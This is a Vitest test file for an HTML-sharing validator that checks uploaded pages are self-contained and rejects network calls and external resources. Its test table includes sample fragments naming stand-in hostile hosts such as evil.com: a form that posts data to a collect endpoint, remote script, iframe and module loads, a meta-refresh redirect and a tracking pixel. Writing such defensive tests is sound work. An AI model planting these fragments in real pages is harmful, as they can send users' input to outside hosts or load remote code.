import { describe, expect, it } from "vitest";
import {
  MAX_SHARE_BYTES,
  describeShareViolations,
  validateShareableHtml,
} from "./sharePublish";

const SELF_CONTAINED_APP = `<!DOCTYPE html><html><head><style>body{color:red}</style></head>
<body><h1>Site Selection Scorecard</h1><script>document.body.dataset.ready="1";</script>
<img src="data:image/png;base64,iVBOR" alt="chart"></body></html>`;

describe("validateShareableHtml — static-only enforcement (mirrors share-routes.js)", () => {
  it("accepts a self-contained mini-app", () => {
    expect(validateShareableHtml(SELF_CONTAINED_APP).ok).toBe(true);
  });

  it("rejects empty documents", () => {
    expect(validateShareableHtml("  ")).toEqual({ ok: false, violations: ["empty_document"] });
  });

  it("rejects oversized documents", () => {
    const big = "<html>" + "x".repeat(MAX_SHARE_BYTES + 1) + "</html>";
    expect(validateShareableHtml(big).violations).toContain("too_large");
  });

  it.each([
    ['<script>fetch("/x")</script>', "network_fetch"],
    ["<script>const x = new XMLHttpRequest()</script>", "network_xhr"],
    ['<script>new WebSocket("wss://e.com")</script>', "network_websocket"],
    ['<script>new EventSource("/s")</script>', "network_eventsource"],
    ['<script>navigator.sendBeacon("/b", d)</script>', "network_sendbeacon"],
    ['<form action="https://evil.com/collect"><input></form>', "form_action"],
    ['<script src="https://cdn.evil.com/x.js"></script>', "external_script"],
    ['<link rel="stylesheet" href="https://cdn.com/a.css">', "external_stylesheet"],
    ['<iframe src="https://evil.com"></iframe>', "external_iframe"],
    ['<script>import("https://evil.com/m.js")</script>', "external_import"],
    ['<meta http-equiv="refresh" content="0;url=https://evil.com">', "meta_refresh_redirect"],
    ['<img src="https://tracker.com/pixel.gif">', "external_media"],
  ])("rejects %s as %s", (fragment, expected) => {
    const result = validateShareableHtml(`<html><body>${fragment}</body></html>`);
    expect(result.ok).toBe(false);
    expect(result.violations).toContain(expected);
  });

  it("allows visible anchor links to sources (research citations)", () => {
    const html = '<html><body><a href="https://example.com/source">Source</a></body></html>';
    expect(validateShareableHtml(html).ok).toBe(true);
  });
});

describe("describeShareViolations — friendly copy, never a dead end", () => {
  it("explains network violations without jargon", () => {
    const copy = describeShareViolations(["network_fetch"]);
    expect(copy).toContain("self-contained");
    expect(copy.toLowerCase()).not.toContain("fetch");
  });

  it("explains size violations", () => {
    expect(describeShareViolations(["too_large"])).toContain("2 MB");
  });

  it("explains external references", () => {
    expect(describeShareViolations(["external_media"])).toContain("self-contained");
  });
});
